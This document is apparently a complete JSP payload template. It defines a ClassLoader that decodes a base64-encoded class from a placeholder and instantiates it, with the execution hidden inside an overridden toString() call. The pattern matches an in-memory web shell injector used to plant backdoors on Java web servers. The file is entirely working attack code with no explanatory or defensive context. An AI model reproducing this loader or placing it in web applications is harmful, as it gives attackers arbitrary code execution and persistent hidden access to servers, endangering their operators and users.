<%!
    public static class ClassDefiner extends ClassLoader {
        public ClassDefiner() {
            super(Thread.currentThread().getContextClassLoader());
        }

        public byte[] decodeBase64(String bytecodeBase64) {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            try {
                Class<?> base64Clz = classLoader.loadClass("java.util.Base64");
                Class<?> decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
                Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
                return (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, bytecodeBase64);
            } catch (Exception ee) {
                try {
                    Class<?> datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
                    return (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, bytecodeBase64);
                } catch (Exception e) {
                    return null;
                }
            }
        }

        public Class<?> defineClass(byte[] code) {
            return defineClass(null, code, 0, code.length);
        }

        @Override
        public String toString() {
            String className = "{{className}}";
            String base64Str = "{{base64Str}}";
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            try {
                classLoader.loadClass(className).newInstance();
            } catch (Exception e) {
                try {
                    byte[] bytecode = decodeBase64(base64Str);
                    Class<?> clazz = defineClass(bytecode);
                    clazz.newInstance();
                } catch (Exception ignored) {
                }
            }
            return className;
        }
    }
%>

<%
    new ClassDefiner().toString();
%>